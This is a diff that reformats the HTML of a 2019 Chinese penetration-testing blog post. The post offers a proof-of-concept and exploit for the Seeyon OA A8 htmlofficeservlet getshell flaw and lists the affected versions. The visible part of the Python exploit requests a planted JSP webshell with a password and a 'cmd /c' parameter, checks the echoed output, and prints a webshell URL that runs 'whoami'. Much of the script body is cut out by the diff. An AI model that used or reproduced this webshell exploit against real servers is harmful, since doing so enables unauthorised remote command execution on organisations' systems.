@@ -1,98 +1,17 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="致远 OA-A8 系统的 Servlet 接口存在漏洞，可通过 /seeyon/htmlofficeservlet 直接getsehll"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</h1>
-      
-<div class="post-meta">
-    <time>2019-06-29</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/getshell">getshell</a>)
-</div>
-
-      <div><h3 id="0x00-影响版本">0x00 影响版本</h3>
-<ul>
-<li>致远A8-V5协同管理软件 V6.1sp1</li>
-<li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li>
-<li>致远A8+协同管理软件 V7.1</li>
-</ul>
-<h3 id="0x01-查看接口看是否存在漏洞">0x01 查看接口看是否存在漏洞</h3>
-<p>如果查看 <code>&quot;seeyon/htmlofficeservlet&quot;</code> 接口，出现如下内容则表示存在漏洞
-<img src="/img/post/Xnip2019-06-29_09-43-32.png" alt="70"></p>
-<h3 id="0x02-poc--exp">0x02 POC &amp; EXP</h3>
-<pre tabindex="0"><code>#!/usr/bin/env python
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="致远 OA-A8 系统的 Servlet 接口存在漏洞，可通过 /seeyon/htmlofficeservlet 直接getsehll"><meta name=author content="Reber"><title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</h1><div class=post-meta><time>2019-06-29</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/getshell>getshell</a>)</div><div><h3 id=0x00-影响版本>0x00 影响版本</h3><ul><li>致远A8-V5协同管理软件 V6.1sp1</li><li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li><li>致远A8+协同管理软件 V7.1</li></ul><h3 id=0x01-查看接口看是否存在漏洞>0x01 查看接口看是否存在漏洞</h3><p>如果查看 <code>"seeyon/htmlofficeservlet"</code> 接口，出现如下内容则表示存在漏洞
+<img src=/img/post/Xnip2019-06-29_09-43-32.png alt=70></p><h3 id=0x02-poc--exp>0x02 POC & EXP</h3><pre tabindex=0><code>#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
 import time
@@ -218,38 +137,12 @@ originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
     resp = requests.get(arg+&#39;/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+echo+ekwjkjrwre&#39;)
     if &#39;ekwjkjrwre&#39; in resp.text:
         print &#34;{} 的 webshell 路径: {}&#34;.format(arg,arg+&#39;/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+whoami&#39;)
-</code></pre><h3 id="0x03-执行得到结果">0x03 执行得到结果</h3>
-<!-- ![](/img/post/Xnip2019-06-29_09-53-16.png) -->
-<p><img src="/img/post/Xnip2019-06-29_09-57-11.png" alt="80"></p>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x03-执行得到结果>0x03 执行得到结果</h3><p><img src=/img/post/Xnip2019-06-29_09-57-11.png alt=80></p></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
